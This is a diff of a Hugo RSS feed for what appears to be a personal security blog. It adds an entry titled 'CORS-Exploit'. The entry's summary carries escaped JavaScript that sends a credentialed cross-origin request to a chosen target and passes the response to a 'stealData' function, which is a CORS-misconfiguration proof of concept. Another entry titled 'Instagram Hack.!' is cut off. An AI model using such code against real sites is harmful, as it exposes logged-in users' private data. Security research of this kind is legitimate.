@@ -6,10 +6,24 @@
     <description>Recent content on Blog-m4xx</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 03 Feb 2019 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sun, 10 Mar 2019 00:00:00 +0000</lastBuildDate>
     
 	<atom:link href="https://m4xx101.github.io/official-blog-website/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>CORS-Exploit</title>
+      <link>https://m4xx101.github.io/official-blog-website/cors-exploit/</link>
+      <pubDate>Sun, 10 Mar 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://m4xx101.github.io/official-blog-website/cors-exploit/</guid>
+      <description>&amp;lt;!DOCTYPE html&amp;gt;   CORS  var turl; function new_target(){ turl = document.getElementById(&amp;lsquo;target&amp;rsquo;).value;
+document.getElementById(&amp;lsquo;lable1&amp;rsquo;).innerHTML = &amp;lsquo;Target Loaded Successfully&amp;rsquo;;
+}
+function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;ldquo;pwnz&amp;rdquo;).innerHTML = this.responseText; } }; xhttp.open(&amp;ldquo;GET&amp;rdquo;, window.turl , true); xhttp.onload = stealData; xhttp.withCredentials = true; xhttp.send();
+} function stealData(){ //read the response, and extract the data var data= JSON.stringify(JSON.parse(this.responseText),null,2);
+ //display it on the page.</description>
+    </item>
     
     <item>
       <title>Instagram Hack.!</title>
